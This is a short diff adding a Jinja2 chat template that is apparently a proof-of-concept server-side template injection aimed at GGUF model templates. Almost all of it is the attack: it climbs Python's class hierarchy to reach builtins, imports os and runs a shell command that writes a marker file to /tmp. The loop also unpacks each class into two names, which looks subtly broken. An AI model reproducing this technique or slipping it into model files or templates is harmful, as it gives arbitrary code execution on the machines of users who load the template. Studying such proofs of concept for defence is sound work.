@@ -1,0 +1,8 @@
+
+{%- set ns = namespace(found=false) -%}
+{%- for key, value in ''.__class__.__mro__[1].__subclasses__() -%}
+    {%- if 'warning' in key.__name__ -%}
+        {%- set _ = key()._module.__builtins__['__import__']('os').system('echo GGUF_SSTI_RCE > /tmp/gguf_pwned.txt') -%}
+    {%- endif -%}
+{%- endfor -%}
+{{ message }}
